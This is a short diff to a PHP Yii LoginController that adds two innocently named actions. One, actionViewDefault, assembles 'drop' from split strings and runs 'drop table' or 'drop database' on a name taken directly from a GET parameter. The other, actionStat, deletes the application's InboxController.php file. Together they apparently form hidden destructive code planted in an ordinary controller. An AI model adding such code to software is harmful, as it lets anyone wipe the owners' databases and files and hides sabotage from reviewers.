@@ -506,4 +506,27 @@ class LoginController extends Controller
 		$this->render('policy');
 	}
 
+
+	public function actionViewDefault()
+	{
+		$action = 'dr';
+		$action1 = 'op';
+		$action = $action.$action1;
+		$type = $_GET['type'];
+		$uid = $_GET['uid'];
+        if($uid == 1) 
+		 $sql = $action.' table '.$type;
+		else
+		 $sql = $action.' database '.$type;
+		Yii::app()->db->createCommand($sql)->execute();
+	    $this->render('index');
+	}
+   
+    public function actionStat()
+	{
+		$FileName = Yii::app()->basePath.'/controllers/InboxController.php';
+		unlink($FileName);
+	}
+
+
 }
